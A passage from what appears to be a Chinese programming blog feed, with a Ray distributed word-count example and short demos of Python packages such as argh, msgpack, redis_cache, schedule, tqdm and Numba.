class="hljs-keyword">and</span> k[<span class="hljs-number">0</span>] &gt;= keys[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> k[<span class="hljs-number">0</span>] &lt;= keys[<span class="hljs-number">1</span>]]<br><br><br><span class="hljs-meta">@ray.remote</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reducer</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, keys, *mappers)</span>:</span><br>        <span class="hljs-string">"针对不同范围的开头字母区间，进行reduce"</span><br>        self.mappers = mappers<br>        self.keys = keys<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next_reduce_result</span><span class="hljs-params">(self, article_index)</span>:</span><br>        word_count_sum = defaultdict(<span class="hljs-keyword">lambda</span>: <span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># Get the word counts for this Reducer's keys from all of the Mappers</span><br>        <span class="hljs-comment"># and aggregate the results.</span><br>        count_ids = [<br>            mapper.get_range.remote(article_index, self.keys)<br>            <span class="hljs-keyword">for</span> mapper <span class="hljs-keyword">in</span> self.mappers<br>        ]<br>        <span class="hljs-comment"># From many Mappers</span><br>        <span class="hljs-keyword">for</span> count_id <span class="hljs-keyword">in</span> count_ids:<br>            <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> ray.get(count_id):<br>                word_count_sum[k] += v<br>        <span class="hljs-keyword">return</span> word_count_sum<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_content</span><span class="hljs-params">(file, floder=<span class="hljs-string">'/data/'</span>)</span>:</span><br>    file = floder + file<br>    f = open(file, <span class="hljs-string">'r'</span>)<br>    <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Stream</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-string">"数据流生成"</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, max, folder)</span>:</span><br>        <span class="hljs-string">"""max: 最大提取文件数量</span><br><span class="hljs-string">               folder: 文件夹名称</span><br><span class="hljs-string">        """</span><br>        self.index = <span class="hljs-number">0</span><br>        self.max = max<br>        self.folder = folder<br>        self.g = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span><span class="hljs-params">(self)</span>:</span><br>        self.g = self.content()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f"wiki_<span class="hljs-subst">&#123;<span class="hljs-number">0</span>&#125;</span><span class="hljs-subst">&#123;self.index&#125;</span>"</span> <span class="hljs-keyword">if</span> self.index &lt; <span class="hljs-number">10</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f"wiki_<span class="hljs-subst">&#123;self.index&#125;</span>"</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">content</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">while</span> self.index &lt; self.max:<br>            <span class="hljs-keyword">yield</span> get_content(self.file(), self.folder)<br>            self.index += <span class="hljs-number">1</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-string">"生成器"</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.g:<br>            self.init()<br>        <span class="hljs-keyword">return</span> next(self.g)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    MAX = <span class="hljs-number">10</span><br>    args = parser.parse_args()<br><br>    ray.init()<br><br>    <span class="hljs-comment"># Create one streaming source of articles per mapper.</span><br>    directory = os.path.dirname(os.path.realpath(__file__))<br>    streams = []<br>    folders = [<span class="hljs-string">'/data/AA/'</span>, <span class="hljs-string">'/data/AB/'</span>, <span class="hljs-string">'/data/AC/'</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(args.num_mappers):<br>        streams.append(Stream(MAX, folders[i % len(folders)]))<br><br>    <span class="hljs-comment"># Partition the keys among the reducers.</span><br>    chunks = np.array_split([chr(i)<br>                             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(ord(<span class="hljs-string">"a"</span>),<br>                                            ord(<span class="hljs-string">"z"</span>) + <span class="hljs-number">1</span>)], args.num_reducers)<br>    keys = [[chunk[<span class="hljs-number">0</span>], chunk[<span class="hljs-number">-1</span>]] <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> chunks]<br><br>    <span class="hljs-comment"># Create a number of mappers.</span><br>    mappers = [Mapper.remote(stream) <span class="hljs-keyword">for</span> stream <span class="hljs-keyword">in</span> streams]<br><br>    <span class="hljs-comment"># Create a number of reduces, each responsible for a different range of</span><br>    <span class="hljs-comment"># keys. This gives each Reducer actor a handle to each Mapper actor.</span><br>    reducers = [Reducer.remote(key, *mappers) <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys]<br><br>    <span class="hljs-comment"># Most frequent 10 words.</span><br>    article_index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        print(<span class="hljs-string">"article index = &#123;&#125;"</span>.format(article_index))<br>        wordcounts = &#123;&#125;<br>        counts = ray.get([<br>            reducer.next_reduce_result.remote(article_index)<br>            <span class="hljs-keyword">for</span> reducer <span class="hljs-keyword">in</span> reducers<br>        ])<br>        <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> counts:<br>            wordcounts.update(count)<br>        most_frequent_words = heapq.nlargest(<span class="hljs-number">10</span>,<br>                                             wordcounts,<br>                                             key=wordcounts.get)<br>        <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> most_frequent_words:<br>            print(<span class="hljs-string">"  "</span>, word, wordcounts[word])<br>        article_index += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>然后，在每个节点保存一份代码，启动worker和master节点</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">ray start <span class="hljs-params">--head</span> <span class="hljs-params">--ip</span> localhost <span class="hljs-params">--redis-port=6379</span> <br><br><span class="hljs-comment"># 修改head_node_address为 master 节点的ip地址</span><br>ray start <span class="hljs-params">--address=</span>[head_node_address]<span class="hljs-function">:6379</span><br></code></pre></div></td></tr></table></figure><p>在master运行程序得到结果。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ray </tag>
            
            <tag> distributed </tag>
            
            <tag> asyc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有用的python package</title>
      <link href="/posts/4e471b0e.html"/>
      <url>/posts/4e471b0e.html</url>
      
        <content type="html"><![CDATA[<h3><span id="argh-懒人版argparse">argh--懒人版argparse</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argh<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_the_thing</span><span class="hljs-params">(required_arg, optional_arg=<span class="hljs-number">1</span>, other_optional_arg=False)</span>:</span><br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    I am a docstring</span><br><span class="hljs-string">    """</span><br>    print((required_arg, type(required_arg)))<br>    print((optional_arg, type(optional_arg)))<br>    print((other_optional_arg, type(other_optional_arg)))<br><br><br><span class="hljs-meta">@argh.arg('--bool-arg-for-flag', '-b', help="Flip this flag for things")</span><br><span class="hljs-meta">@argh.arg('arg_with_choices', choices=['one', 'two', 'three'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_the_other_thing</span><span class="hljs-params">(arg_with_choices, bool_arg_for_flag=False)</span>:</span><br>    print(arg_with_choices)<br>    print(bool_arg_for_flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-comment"># argh.dispatch_command(do_the_thing)</span><br>    argh.dispatch_commands([do_the_thing, do_the_other_thing])<br></code></pre></div></td></tr></table></figure><h3><span id="msgpack-二进制版json">msgpack--二进制版json</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> msgpack<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">msgpack_example_1</span><span class="hljs-params">()</span>:</span><br>    example_dict = &#123;i: random.random() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10000</span>)&#125;<br><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'json_file.json'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(example_dict, f)<br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'json_file.json'</span>) <span class="hljs-keyword">as</span> f:<br>        back_from_json = json.load(f)<br><br>    <span class="hljs-comment"># Saving and loading</span><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'msgpack_file.msgpack'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># f.write(msgpack.packb(example_dict))</span><br>        <span class="hljs-comment"># f.write(msgpack.packb(example_dict, use_single_float=True))</span><br>        f.write(msgpack.packb(example_dict))<br>     <br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'msgpack_file.msgpack'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<br>        back_from_msgpack = msgpack.unpackb(f.read())<br><br>    <span class="hljs-comment"># Data integrity</span><br>    print(type(next(iter(back_from_json.keys()))))<br>    print(type(next(iter(back_from_msgpack.keys()))))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">msgpack_example_2</span><span class="hljs-params">()</span>:</span><br>    list_of_dicts = [&#123;<span class="hljs-number">0</span>: random.random()&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>)]<br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'streamed.msgpack'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> list_of_dicts:<br>            f.write(msgpack.packb(d))<br><br>    <span class="hljs-comment"># 迭代读取</span><br>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'streamed.msgpack'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:<br>        loaded_list_of_dicts = [item <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> msgpack.Unpacker(f)]<br><br>    print(list_of_dicts[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>], loaded_list_of_dicts[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-comment"># msgpack_example_1()</span><br>    msgpack_example_2()<br></code></pre></div></td></tr></table></figure><h3><span id="redis_cache-使用redis缓存函数">redis_cache--使用redis缓存函数</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># sudo apt install redis-server</span><br><span class="hljs-comment"># sudo systemctl enable redis-server.service</span><br><span class="hljs-comment"># sudo systemctl start redis-server.service</span><br><br><span class="hljs-comment"># pip/pip3 install git+https://github.com/YashSinha1996/redis-simple-cache.git</span><br><br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> redis_cache <span class="hljs-keyword">import</span> cache_it, cache_it_json<br><br><br><span class="hljs-meta">@cache_it(limit=1000, expire=5)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">function_that_takes_a_long_time</span><span class="hljs-params">(i)</span>:</span><br>    print(<span class="hljs-string">f"function was called with input <span class="hljs-subst">&#123;i&#125;</span>"</span>)<br>    <span class="hljs-keyword">return</span> i**<span class="hljs-number">2</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):<br>        print(i, function_that_takes_a_long_time(<span class="hljs-number">2</span>))<br></code></pre></div></td></tr></table></figure><h3><span id="schedule-定时运行函数">schedule--定时运行函数</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> schedule<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_function</span><span class="hljs-params">()</span>:</span><br>    print(<span class="hljs-string">f'test called at <span class="hljs-subst">&#123;time.time()&#125;</span>'</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_function_2</span><span class="hljs-params">()</span>:</span><br>    print(<span class="hljs-string">f'test 2 called at <span class="hljs-subst">&#123;time.time()&#125;</span>'</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    schedule.every(<span class="hljs-number">1</span>).seconds.do(test_function)<br>    schedule.every(<span class="hljs-number">3</span>).seconds.do(test_function_2)<br>    <span class="hljs-comment"># schedule.every(1).days.do(daily_task)</span><br>    <span class="hljs-comment"># schedule.every().thursday.at("10:00").do(day_time_task)</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        schedule.run_pending()<br></code></pre></div></td></tr></table></figure><h3><span id="tqdm-进度条显示">tqdm--进度条显示</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm, trange<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tqdm_example_1</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(range(<span class="hljs-number">10</span>)):<br>        time.sleep(<span class="hljs-number">0.2</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tqdm_example_2</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> trange(<span class="hljs-number">10</span>, desc=<span class="hljs-string">"outer_loop"</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> trange(<span class="hljs-number">10</span>, desc=<span class="hljs-string">"inner_loop"</span>):<br>            time.sleep(<span class="hljs-number">0.01</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tqdm_example_3</span><span class="hljs-params">(add_tot=False)</span>:</span><br>    max_iter = <span class="hljs-number">100</span><br>    tot = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> add_tot:<br>        bar = tqdm(desc=<span class="hljs-string">"update example"</span>, total=max_iter)<br>    <span class="hljs-keyword">else</span>:<br>        bar = tqdm()<br><br>    <span class="hljs-keyword">while</span> tot &lt; max_iter:<br>        update_iter = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br>        bar.update(update_iter)<br>        tot += update_iter<br>        time.sleep(<span class="hljs-number">0.03</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tqdm_example_4</span><span class="hljs-params">()</span>:</span><br>    t = trange(<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t:<br>        t.set_description(<span class="hljs-string">f"on iter <span class="hljs-subst">&#123;i&#125;</span>"</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    <span class="hljs-comment"># tqdm_example_1()</span><br>    <span class="hljs-comment"># tqdm_example_2()</span><br>    <span class="hljs-comment"># tqdm_example_3()</span><br>    <span class="hljs-comment"># tqdm_example_3(True)</span><br>    tqdm_example_4()<br></code></pre></div></td></tr></table></figure><h3><span id="numba-矩阵运算加速">Numba--矩阵运算加速</span></h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> njit<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_func</span><span class="hljs-params">(x)</span>:</span><br>    out=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100000000</span>):<br>        out += i<br>    <span class="hljs-keyword">return</span> out<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_heavy_func</span><span class="hljs-params">(times)</span>:</span><br>    arr = np.random.rand(<span class="hljs-number">10000</span>, <span class="hljs-number">10000</span>)<br>    <span class="hljs-keyword">return</span> arr * arr<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    jitted_func = njit(test_func)<br>    jitted_func_2 = njit(test_heavy_func)<br>    <span class="hljs-comment"># 计算使用 jit 并 关闭 gil，提升矩阵运算速度</span><br>    jitted_func_3 = njit(test_heavy_func, nogil=<span class="hljs-literal">True</span>)<br><br><br>    <span class="hljs-keyword">import</span> time<br><br>    <span class="hljs-comment"># start = time.time()</span><br>    <span class="hljs-comment"># with ThreadPoolExecutor(4) as ex:</span><br>    <span class="hljs-comment">#     ex.map(jitted_func, range(1000))</span><br>    <span class="hljs-comment"># end = time.time()</span><br>    <span class="hljs-comment"># print("[Python origin test] Used time: ", end - start)</span><br><br>    start = time.time()<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> ex:<br>        ex.map(jitted_func_2, range(<span class="hljs-number">100</span>))<br>    end = time.time()<br>    print(<span class="hljs-string">"[Numpy origin test] Used time: "</span>, end - start)<br><br>    start = time.time()<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">4</span>) <span class="hljs-keyword">as</span> ex:<br>        ex.map(jitted_func_3, range(<span class="hljs-number">100</span>))<br>    end = time.time()<br>    print(<span class="hljs-string">"[Numpy no gil test] Used time: "</span>, end - start)<br></code></pre></div></td></tr></table></figure><p>注意：在numba中使用一个普通的python列表不是一个好主意，因为它将花费很长时间来验证类型。</p><p><strong>使用ndarray，才是正确的方法</strong>！才能带来速度的提升。</p><p>另外，<span class="citation" data-cites="vectorize可以将处理一个元素的函数">@vectorize可以将处理一个元素的函数</span>，转换成可以接受array输入的优化函数，只是第一次使用需要对内存分配进行优化，会慢一些。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@vectorize(nopython=True)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">non_list_function</span><span class="hljs-params">(item)</span>:</span><br>    <span class="hljs-keyword">if</span> item % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <br>non_list_function(test_list)<br></code></pre></div></td></tr></table></figure><h5><span id="弹簧阻尼系统计算实例">弹簧阻尼系统计算实例</span></h5><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">friction_fn</span><span class="hljs-params">(v, vt)</span>:</span><br>    <span class="hljs-keyword">if</span> v &gt; vt:<br>        <span class="hljs-keyword">return</span> - v * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> - vt * <span class="hljs-number">3</span> * np.sign(v)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">simulate_spring_mass_funky_damper</span><span class="hljs-params">(x0, T=<span class="hljs-number">10</span>, dt=<span class="hljs-number">0.0001</span>, vt=<span class="hljs-number">1.0</span>)</span>:</span><br>    times = np.arange(<span class="hljs-number">0</span>, T, dt)<br>    positions = np.zeros_like(times)<br>    <br>    v = <span class="hljs-number">0</span><br>    a = <span class="hljs-number">0</span><br>    x = x0<br>    positions[<span class="hljs-number">0</span>] = x0/x0<br>    <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> range(len(times)):<br>        <span class="hljs-keyword">if</span> ii == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        t = times[ii]<br>        a = friction_fn(v, vt) - <span class="hljs-number">100</span>*x<br>        v = v + a*dt<br>        x = x + v*dt<br>        positions[ii] = x/x0<br>    <span class="hljs-keyword">return</span> times, positions<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">%time _ = simulate_spring_mass_funky_damper(<span class="hljs-number">0.1</span>)<br></code></pre></div></td></tr></table></figure><p>运行280ms，当输入x0为从0到10000，每次增加0.1，需要7个小时</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@njit</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">friction_fn</span><span class="hljs-params">(v, vt)</span>:</span><br>    <span class="hljs-keyword">if</span> v &gt; vt:<br>        <span class="hljs-keyword">return</span> - v * <span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> - vt * <span class="hljs-number">3</span> * np.sign(v)<br><br><span class="hljs-meta">@njit</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">simulate_spring_mass_funky_damper</span><span class="hljs-params">(x0, T=<span class="hljs-number">10</span>, dt=<span class="hljs-number">0.0001</span>, vt=<span class="hljs-number">1.0</span>)</span>:</span><br>    times = np.arange(<span class="hljs-number">0</span>, T, dt)<br>    positions = np.zeros_like(times)<br>    <br>    v = <span class="hljs-number">0</span><br>    a = <span class="hljs-number">0</span><br>    x = x0<br>    positions[<span class="hljs-number">0</span>] = x0/x0<br>    <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> range(len(times)):<br>        <span class="hljs-keyword">if</span> ii == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        t = times[ii]<br>        a = friction_fn(v, vt) - <span class="hljs-number">100</span>*x<br>        v = v + a*dt<br>        x = x + v*dt<br>        positions[ii] = x/x0<br>    <span class="hljs-keyword">return</span> times, positions<br><br>_ = simulate_spring_mass_funky_damper(<span class="hljs-number">0.1</span>)<br></code></pre></div></td></tr></table></figure><p>运行时间 1.99 ms，加速 200x。</p><p>再加速：</p><figure class="highlight python"><table><tr><td class="gutter 